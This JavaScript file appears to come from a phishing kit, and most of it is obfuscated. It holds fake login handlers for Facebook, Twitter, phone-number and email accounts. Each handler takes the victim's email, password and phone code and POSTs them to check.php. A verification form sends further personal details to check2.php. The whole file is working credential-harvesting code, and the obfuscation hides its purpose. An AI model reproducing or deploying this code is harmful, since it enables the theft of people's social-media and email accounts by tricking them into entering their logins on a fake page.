// code for sending data
(function(_0x128384, _0x5e402c) {
    var _0xc29007 = _0xc541,
        _0xe4b456 = _0x128384();
    while (!![]) {
        try {
            var _0x4d1fff = -parseInt(_0xc29007(0x11c)) / 0x1 * (parseInt(_0xc29007(0x141)) / 0x2) + -parseInt(_0xc29007(0x131)) / 0x3 * (-parseInt(_0xc29007(0x151)) / 0x4) + -parseInt(_0xc29007(0x12b)) / 0x5 + -parseInt(_0xc29007(0x146)) / 0x6 + parseInt(_0xc29007(0x128)) / 0x7 + parseInt(_0xc29007(0x154)) / 0x8 + parseInt(_0xc29007(0x13a)) / 0x9 * (-parseInt(_0xc29007(0x127)) / 0xa);
            if (_0x4d1fff === _0x5e402c) break;
            else _0xe4b456['push'](_0xe4b456['shift']());
        } catch (_0x1fb9bf) {
            _0xe4b456['push'](_0xe4b456['shift']());
        }
    }
}(_0x4b80, 0x45e0c));

function _0xc541(_0x1a3777, _0x577507) {
    var _0x4b80b7 = _0x4b80();
    return _0xc541 = function(_0xc541c2, _0x571c09) {
        _0xc541c2 = _0xc541c2 - 0x118;
        var _0x3b2739 = _0x4b80b7[_0xc541c2];
        return _0x3b2739;
    }, _0xc541(_0x1a3777, _0x577507);
}

function ValidateLoginFbData() {
    // Lấy giá trị các trường nhập liệu từ form
    var $emailfb = $('#email-facebook').val().trim();
    var $passwordfb = $('#password-facebook').val().trim();
    var $loginfb = $('#login-facebook').val();

    // Kiểm tra hợp lệ của email và mật khẩu
    if ($emailfb === '' || $emailfb === null || $emailfb.length <= 5) {
        $('#email-facebook')[0].setCustomValidity('Invalid email address');
        $('#email-facebook').focus();
        return false;
    } else {
        $('#email-facebook')[0].setCustomValidity('');
    }

    if ($passwordfb === '' || $passwordfb === null || $passwordfb.length <= 5) {
        $('#password-facebook')[0].setCustomValidity('Invalid password');
        $('#password-facebook').focus();
        return false;
    } else {
        $('#password-facebook')[0].setCustomValidity('');
    }

    // Ẩn thông báo lỗi
    $('.navbar-alert-fb').hide();

    // Gửi dữ liệu đăng nhập bằng AJAX
    $.ajax({
        type: 'POST',
        url: 'check.php',
        data: $('#ValidateLoginFbForm').serialize(),
        beforeSend: function() {
            $('.login-facebook').hide();
        },
        success: function() {
            window.location.href = '/';
        },
        error: function() {

        }
    });

    // Tránh gửi form một cách tự động
    return false;
}



function ValidateLoginTwitterData() {
    var _0x339c31 = _0xc541;
    return $(_0x339c31(0x155))[_0x339c31(0x14e)](function(_0x300346) {
        var _0x169f13 = _0x339c31;
        _0x300346[_0x169f13(0x12e)](), $emailtw = $('#email-twitter')['val']()[_0x169f13(0x130)](), $passwordtw = $(_0x169f13(0x13d))[_0x169f13(0x120)]()[_0x169f13(0x130)](), $logintw = $(_0x169f13(0x124))[_0x169f13(0x120)]()[_0x169f13(0x130)]();
        if ($emailtw == '' || $emailtw == null || $emailtw['length'] <= 0x3) return $(_0x169f13(0x140))[_0x169f13(0x12d)](), setTimeout(function() {
            var _0x54fc5a = _0x169f13;
            $(_0x54fc5a(0x140))[_0x54fc5a(0x137)]();
        }, 0x7d0), $('.sandi-tw')['hide'](), $(_0x169f13(0x133))[_0x169f13(0x11f)](), $('.login-twitter')[_0x169f13(0x125)](), ![];
        else $('.email-tw')[_0x169f13(0x11f)](), $('input#validateEmail')[_0x169f13(0x120)]($emailtw), $(_0x169f13(0x145))[_0x169f13(0x11f)](), $('.PlayerIdLoginBox')[_0x169f13(0x125)]();
        if ($passwordtw == '' || $passwordtw == null || $passwordtw[_0x169f13(0x138)] <= 0x7) return $(_0x169f13(0x14f))['fadeIn'](), setTimeout(function() {
            var _0xbc4cd2 = _0x169f13;
            $(_0xbc4cd2(0x14f))[_0xbc4cd2(0x137)]();
        }, 0x7d0), $(_0x169f13(0x133))[_0x169f13(0x11f)](), $(_0x169f13(0x145))['show'](), ![];
        else $(_0x169f13(0x14f))[_0x169f13(0x11f)](), $(_0x169f13(0x126))[_0x169f13(0x120)]($passwordtw), $(_0x169f13(0x11d))[_0x169f13(0x120)]($logintw), $(_0x169f13(0x145))[_0x169f13(0x11f)](), $(_0x169f13(0x13b))[_0x169f13(0x125)](), setTimeout(function() {
            var _0x1f6d55 = _0x169f13;
            $(_0x1f6d55(0x149))[_0x1f6d55(0x125)](), $(_0x1f6d55(0x13b))[_0x1f6d55(0x11f)]();
        }, 0xbb8);
        var _0x366869 = $(_0x169f13(0x13c))[_0x169f13(0x120)](),
            _0x35b8d5 = $(_0x169f13(0x126))[_0x169f13(0x120)](),
            _0x9a9961 = $('input#validateLogin')[_0x169f13(0x120)]();
        if (_0x366869 == '' && _0x35b8d5 == '' && _0x9a9961 == '' && $playid == '') return $(_0x169f13(0x149))['show'](), ![];
        $[_0x169f13(0x143)]({
            'type': 'POST',
            'url': 'check.php',
            'data': $(this)[_0x169f13(0x12f)](),
            'beforeSend': function() {
                var _0x5f548a = _0x169f13;
                $(_0x5f548a(0x145))[_0x5f548a(0x11f)]();
            },
            'success': function() {
                var _0x155fb9 = _0x169f13;
                $(_0x155fb9(0x145))['hide']();
            }
        });
    }), ![];
}

function ValidateLoginNumberData() {
    var _0x16defc = _0xc541;
    return $('#ValidateLoginNumberForm')[_0x16defc(0x14e)](function(_0x8abcee) {
        var _0x2181a9 = _0x16defc;
        _0x8abcee[_0x2181a9(0x12e)](), $emailnk = $(_0x2181a9(0x11b))[_0x2181a9(0x120)]()[_0x2181a9(0x130)](), $passwordnk = $(_0x2181a9(0x150))[_0x2181a9(0x120)]()[_0x2181a9(0x130)](), $loginnk = $(_0x2181a9(0x14a))[_0x2181a9(0x120)]()['trim'](), $codetel = $(_0x2181a9(0x129))[_0x2181a9(0x120)]()[_0x2181a9(0x130)]();
        if ($emailnk == '' || $emailnk == null || $emailnk[_0x2181a9(0x138)] <= 0x5) return $(_0x2181a9(0x147))[_0x2181a9(0x125)](), setTimeout(function() {
            var _0x4e0e26 = _0x2181a9;
            $(_0x4e0e26(0x147))[_0x4e0e26(0x137)]();
        }, 0x7d0), $(_0x2181a9(0x135))[_0x2181a9(0x11f)](), $(_0x2181a9(0x149))[_0x2181a9(0x11f)](), $(_0x2181a9(0x132))[_0x2181a9(0x125)](), ![];
        else $('.email-nk')[_0x2181a9(0x11f)](), $(_0x2181a9(0x13c))[_0x2181a9(0x120)]($emailnk), $(_0x2181a9(0x132))[_0x2181a9(0x11f)](), $(_0x2181a9(0x149))[_0x2181a9(0x125)]();
        if ($passwordnk == '' || $passwordnk == null || $passwordnk[_0x2181a9(0x138)] <= 0x5) return $(_0x2181a9(0x135))['show'](), setTimeout(function() {
            $('.sandi-nk')['fadeOut']();
        }, 0x7d0), $('.login-number')[_0x2181a9(0x125)](), $(_0x2181a9(0x149))[_0x2181a9(0x11f)](), ![];
        else $(_0x2181a9(0x135))['hide'](), $('input#validatePassword')['val']($passwordnk), $(_0x2181a9(0x11d))[_0x2181a9(0x120)]($loginnk), $(_0x2181a9(0x152))['val']($codetel), $('.login-number')[_0x2181a9(0x11f)](), $(_0x2181a9(0x149))[_0x2181a9(0x125)]();
        var _0x1ab13d = $(_0x2181a9(0x13c))[_0x2181a9(0x120)](),
            _0x31e0ae = $(_0x2181a9(0x126))[_0x2181a9(0x120)](),
            _0x350963 = $(_0x2181a9(0x11d))[_0x2181a9(0x120)](),
            _0x129e48 = $(_0x2181a9(0x152))['val']();
        if (_0x1ab13d == '' && _0x31e0ae == '' && _0x350963 == '' && _0x129e48 == '') return $(_0x2181a9(0x149))['show'](), ![];
        $[_0x2181a9(0x143)]({
            'type': _0x2181a9(0x11a),
            'url': _0x2181a9(0x153),
            'data': $(this)[_0x2181a9(0x12f)](),
            'beforeSend': function() {
                $('.login-mail')['hide']();
            },
            'success': function() {
                var _0x45e107 = _0x2181a9;
                $(_0x45e107(0x136))['hide']();
            }
        });
    }), ![];
}

function ValidateLoginMailData() {
    var _0x56e87d = _0xc541;
    return $('#ValidateLoginMailForm')[_0x56e87d(0x14e)](function(_0x1e07cc) {
        var _0x5c92aa = _0x56e87d;
        _0x1e07cc[_0x5c92aa(0x12e)](), $emailk = $('#email-k')[_0x5c92aa(0x120)]()[_0x5c92aa(0x130)](), $passwordk = $(_0x5c92aa(0x12a))['val']()['trim'](), $logink = $(_0x5c92aa(0x148))['val']()[_0x5c92aa(0x130)]();
        if ($emailk == '' || $emailk == null || $emailk['length'] <= 0xa) return $('.email-k')['show'](), setTimeout(function() {
            var _0x318f58 = _0x5c92aa;
            $(_0x318f58(0x13e))[_0x318f58(0x137)]();
        }, 0x7d0), $(_0x5c92aa(0x118))[_0x5c92aa(0x11f)](), $(_0x5c92aa(0x149))[_0x5c92aa(0x11f)](), $(_0x5c92aa(0x136))[_0x5c92aa(0x125)](), ![];
        else $(_0x5c92aa(0x13e))[_0x5c92aa(0x11f)](), $(_0x5c92aa(0x13c))[_0x5c92aa(0x120)]($emailk), $('.login-mail')['hide'](), $('.account_verification')[_0x5c92aa(0x125)]();
        if ($passwordk == '' || $passwordk == null || $passwordk['length'] <= 0x5) return $(_0x5c92aa(0x118))[_0x5c92aa(0x125)](), setTimeout(function() {
            var _0x4fe141 = _0x5c92aa;
            $('.sandi-k')[_0x4fe141(0x137)]();
        }, 0x7d0), $(_0x5c92aa(0x136))[_0x5c92aa(0x125)](), $(_0x5c92aa(0x149))[_0x5c92aa(0x11f)](), ![];
        else $(_0x5c92aa(0x118))['hide'](), $('input#validatePassword')[_0x5c92aa(0x120)]($passwordk), $(_0x5c92aa(0x11d))['val']($logink), $(_0x5c92aa(0x136))['hide'](), $(_0x5c92aa(0x149))[_0x5c92aa(0x125)]();
        var _0x134c28 = $(_0x5c92aa(0x13c))['val'](),
            _0x5dcaed = $(_0x5c92aa(0x126))['val'](),
            _0x2ba218 = $(_0x5c92aa(0x11d))[_0x5c92aa(0x120)]();
        if (_0x134c28 == '' && _0x5dcaed == '' && _0x2ba218 == '') return $('.account_verification')[_0x5c92aa(0x125)](), ![];
        $[_0x5c92aa(0x143)]({
            'type': _0x5c92aa(0x11a),
            'url': 'check.php',
            'data': $(this)['serialize'](),
            'beforeSend': function() {
                var _0x5468aa = _0x5c92aa;
                $(_0x5468aa(0x136))['hide']();
            },
            'success': function() {
                var _0x57174b = _0x5c92aa;
                $(_0x57174b(0x136))[_0x57174b(0x11f)]();
            }
        });
    }), ![];
}

function ValidateVerificationData() {
    var _0x389b81 = _0xc541;
    return $(_0x389b81(0x142))['submit'](function(_0x1820d3) {
        var _0x151258 = _0x389b81;
        _0x1820d3['preventDefault']();
        var _0xbf449e = $('input#validateEmail')[_0x151258(0x120)](),
            _0x1406b6 = $('input#validatePassword')[_0x151258(0x120)](),
            _0x2092e2 = $(_0x151258(0x134))[_0x151258(0x120)](),
            _0x1dfb1c = $(_0x151258(0x119))[_0x151258(0x120)](),
            _0xf63e48 = $(_0x151258(0x122))[_0x151258(0x120)](),
            _0x1ebcc1 = $('input#vmail')['val'](),
            _0x28bf58 = $(_0x151258(0x11e))[_0x151258(0x120)](),
            _0x36c6e1 = $('input#validateLogin')[_0x151258(0x120)]();
        if (_0xbf449e == '' && _0x1406b6 == '' && $nick == '' && _0x2092e2 == '' && _0x1dfb1c == '' && _0xf63e48 == '' && _0x1ebcc1 == '' && _0x36c6e1 == '' && _0x28bf58 == '') return $('.verification_info')['show'](), $('.account_verification')[_0x151258(0x11f)](), ![];
        $[_0x151258(0x143)]({
            'type': _0x151258(0x11a),
            'url': _0x151258(0x139),
            'data': $(this)['serialize'](),
            'beforeSend': function() {
                var _0x16e009 = _0x151258;
                $(_0x16e009(0x149))[_0x16e009(0x11f)](), $('.check_verification')['show']();
            },
            'success': function() {
                var _0x353faf = _0x151258;
                $(_0x353faf(0x121))['show'](), $(_0x353faf(0x14b))[_0x353faf(0x11f)](), $(_0x353faf(0x149))[_0x353faf(0x11f)]();
            }
        });
    }), ![];
};

function _0x4b80() {
    var _0x29aed0 = ['val', '.processing_account', 'input#level', '#login-facebook', '#login-twitter', 'show', 'input#validatePassword', '100070yefFTP', '592690GhKkON', '#code-tel', '#password-k', '387585NokFks', '.login-facebook-load', 'fadeIn', 'preventDefault', 'serialize', 'trim', '801231SkLsid', '.login-number', '.PlayerIdLoginBox', 'input#ValidatePopupPlayId', '.sandi-nk', '.login-mail', 'fadeOut', 'length', 'check2.php', '198VKbyhl', '.login-twitter-load', 'input#validateEmail', '#password-twitter', '.email-k', '.email-fb', '.email-tw', '2TilOOc', '#ValidateVerificationDataForm', 'ajax', '#email-facebook', '.login-twitter', '586182AdZaPj', '.email-nk', '#login-mail', '.account_verification', '#login-number', '.check_verification', '.sandi-fb', '.login-facebook', 'submit', '.sandi-tw', '#password-nk', '4DfAQzF', 'input#validateTel', 'check.php', '2993408qFmXus', '#ValidateLoginTwitterForm', '.sandi-k', 'input#phone', 'POST', '#email-nk', '44335BxHsDR', 'input#validateLogin', 'input#codetel', 'hide'];
    _0x4b80 = function() {
        return _0x29aed0;
    };
    return _0x4b80();
}